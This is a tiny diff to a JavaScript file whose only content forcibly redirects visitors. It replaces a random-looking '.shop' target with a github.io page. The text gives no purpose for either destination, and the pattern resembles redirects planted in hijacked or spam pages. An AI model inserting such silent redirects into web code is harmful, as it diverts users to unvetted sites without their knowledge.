@@ -1,5 +1,6 @@
 (function() {
-    window['location'] = 'https://ggsorktjnzsngjib.shop/';
+    window['location'] = 'https://aa168188.github.io/heihe1/';
 })();
+
 
 
